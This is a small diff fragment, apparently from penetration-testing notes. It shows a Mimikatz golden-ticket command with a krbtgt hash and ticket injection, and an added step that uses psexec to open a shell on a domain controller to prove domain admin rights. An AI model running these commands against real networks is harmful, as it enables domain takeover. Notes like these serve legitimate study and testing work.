@@ -77,6 +77,7 @@ kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
 2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
 ```
 
+Prove we have DA permissions:
 ```
 misc::cmd
 psexec.exe \\dc01 cmd.exe
